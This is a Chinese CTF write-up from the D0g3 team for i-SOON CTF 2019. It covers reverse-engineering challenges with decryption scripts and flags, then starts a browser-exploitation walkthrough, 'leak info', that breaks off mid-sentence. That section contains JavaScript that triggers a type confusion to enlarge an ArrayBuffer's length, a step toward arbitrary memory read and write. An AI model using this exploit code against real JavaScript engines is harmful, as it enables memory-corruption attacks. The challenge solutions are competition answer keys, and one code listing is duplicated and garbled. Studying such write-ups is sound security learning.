本文由 [@D0g3](https://www.d0g3.cn/about) 编写
i-SOON_CTF_2019 部分题目环境/源码  
> 广告一波:  
>  H1ve 是一款自研 CTF 平台，同时具备解题、攻防对抗模式。其中，解题赛部分对 Web 和 Pwn 题型，支持独立题目容器及动态 Flag
> 防作弊。攻防对抗赛部分支持 AWD 一键部署，并配备炫酷地可视化战况界面。  
>  该作品随着安洵杯比赛进程，逐步开源，敬请期待 [Github项目地址](https://github.com/D0g3-Lab/H1ve)
# Re
## crackme
1.main函数之前
程序HOOK了MessageBoxW函数，让其执行一个自己写的函数
2.main函数
输入一串字符串，并且执行了MessageBoxW函数，由于函数被IAT HOOK，执行了自己写的一个函数，在函数之中，改变了BASE64的字母表（大
小写互换）并且添加了异常VEH向量。  
执行完函数之后，程序注册了一个SEH，并且触发异常。
3.异常
VEH  
异常触发首先执行VEH向量，VEH向量进行了SM4的密钥初始化，并且注册了UnhandledExceptionFilter
SEH  
进行了SM4加密
UnhandledExceptionFilter  
改变了比较的结果，并且进行变种base64加密
异常回调  
执行main函数的比较函数
解密脚本
    from pysm4 import encrypt,decrypt
    import base64
    mk = 0x77686572655F6172655F755F6E6F773F
    base_now="yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxi!"
    base_init="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/i="
    clear="1UTAOIkpyOSWGv/mOYFY4R!!"
    clear_re=""
    for i in range(len(clear)):
        if(i%2==0):
            clear_re+=clear[i+1]
        else:
            clear_re+=clear[i-1]
    c=""
    for i in range(len(clear_re)):
        b=base_now.find(clear_re[i])
        c+=base_init[b]
    c=base64.b64decode(c)
    c=int(c.encode("hex"),16)
    clear_num=decrypt(c,mk)
    clear_num=hex(clear_num)[2:-1].decode("hex")
    print clear_num
## Easy Encryption
1.base64解密字符串：YXJ0cWtvZWhxcGtiaWh2
2.将固定字符串按照规则解密即可
    字符串：**artqkoehqpkbihv**
        解密如下：
    #include 
    #include 
    #include 
    using namespace std;
    char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char resl[] = "artqkoehqpkbihv";
    //D0M3GVOMTOac
    char Vignia(char a,int n,int* str1,int h)
    {
        return (((int)a - 97 + str1[n+h*15]) % 26 + 97) 
    #include 
    #include 
    using namespace std;
    char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char resl[] = "artqkoehqpkbihv";
    //D0M3GVOMTOac
    char Vignia(char a,int n,int* str1,int h)
    {
        return (((int)a - 97 + str1[n+h*15]) % 26 + 97) <= 122
                    ? (char)(((int)a - 97 + str1[n+h*15]) % 26 + 97) :
                    (char)(((int)a - 97 + str1[n+h*15]) % 26 + 97 - 26);
    }
    int main()
    {
        int len,i, j;
        int key1[1000];
        char flag[30];
        char tmp;
        len = strlen(resl);
        i = 0;
        while (base64[i] != '\0')
        {
            key1[i] = (int)abs(base64[i] - 97);//取绝对值
            i++;
        }
        for (int h = 4; h < len; h++)
        {
            for (j = 48; j < 126; j++)
            {
                for (i = 0; i < 4; i++)
                {
                    if (Vignia((char)j, h, key1, i) != resl[h])
                        break;
                    flag[h] = (char)j;
                }
            }
        }
        for (int h = 0; h < 4; h++)
        {
            for (j = 48; j < 126; j++)
            {
                for (i = 0; i < 5; i++)
                {
                    if (Vignia((char)j, h, key1, i) != resl[h])
                        break;
                    flag[h] = (char)j;
                }
            }
        }
        flag[len] = 0x00;
        printf("%s", flag);
        printf("\n");
        return 0;
    }
此处使用遍历的方式解题
flag： **umpnineissogood**
## Game
这个题目的主要考点是平坦化的去除  
题目的加密很简单  
输入，然后check1和check3对输入进行了加密处理  
变换很简单  
解题的关键就是找到原来的数独，和填好的数独，提取填好的数字，然后做check1中的逆向操作就可以得到flag  
填入数独的数字为：4693641762894685722843556137219876255986  
Flag为：KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J
## leak info
1 触发漏洞，造成溢出  
更加样本，修改其中一些部分，然后做到溢出部分修改了某个ArrayBuffer byteLength。  
给出样本代码：
    let buf = [];
    for(var i = 0 ; i < 4 ;i++)
    {
        buf[i] = new ArrayBuffer(0x20);
    }
    var OOb_Object = buf[0];
    var ChangeObject_Index = 0;
    let buf_uint8 = new Uint8Array(OOb_Object);
    let y = new Uint32Array(OOb_Object);
    const v4 = [y, y, y, y, y];
    function v7(v31) {
        if (v4.length == 0) {
            v4[3] = y;
        }
        const v11 = v4.pop();
        v11[18] = 0xa0; 
        for (let v15 = 0; v15 < 10000; v15++) {}
    }
    var p = {};
    p = [buf_uint8, y, y];
    v4.__proto__ = p;
    for (let v31 = 0; v31 < 2000; v31++) {
        v7(v31);
    }
    for(var i = 0 ; i < 10 ; i++)
    {
        var len = buf[i].byteLength;
        if( len != 0x20)
        {
            ChangeObject_Index = i;
            break;
        }
    }
上面的过程，将触发漏洞修改到 buf[1] 的byteLength 部分。从原来的 0x20 修改为0xa0。  
这样就获得一个溢出的ArrayBuffer 对象，如下图。
注意申请的ArrayBuffer在内存的布局，它们是连续的。  
另外，使用windbg 进行调试的时候，内存十分庞大，用常规的 s –d 等指令搜索会很慢很慢。  
这里建议使用 !address 命令，然后找到类似如下图的内存，这些内存就是一些零散的堆块，用来存放申请的对象等数据。  
然后在某一个buf 设置一些特殊值，比如：0x67890001
使用
Notepad++ 的列编辑功能，把上图的地址直接一列抓出来
复制到下面这样的位置，然后复制全部的命令，粘贴到windbg
，进行搜索。
如下图，这样搜索起来，快很多
2.利用溢出的ArrayBuffer  
使用长度被该为0xa0的ArrayBuffer
，修改到下一个ArrayBuffer的长度，改为0x90400，这就是一个非常长的ArrayBuffer对象。方便后面做 任意地址读写了。  
为什么要用0xa0 的ArrayBuffer来做到这一步，为什么不在漏洞触发的时候，就把0xa0的长度写长一些呢？  
这是因为，漏洞触发的时候，混淆的对象是 Uint8Array 与 Uint32Array，Uint8Array
对象每次只能写入一个Byte。所以修改的数据最大也只能是0xFF。  
具体情况动手去分析就明白了。
3.任意地址读写  
前面，已经有了一个byteLength 为0x90400的ArrayBuffer 。将这个ArrayBuffer初始化，可以初始化化为